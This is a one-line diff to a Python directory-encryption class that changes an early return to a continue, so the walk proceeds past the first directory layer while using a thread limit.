@@ -78,7 +78,7 @@ class DirectoryEncryptor(FileEncryptor):
             if self.first_layer:
                 self.first_layer = False
                 self.crypt_all_dirs(subdirs)
-                return
+                continue
 
             for directory in subdirs:
                 if len(self.threads) < MAX_THREADS:
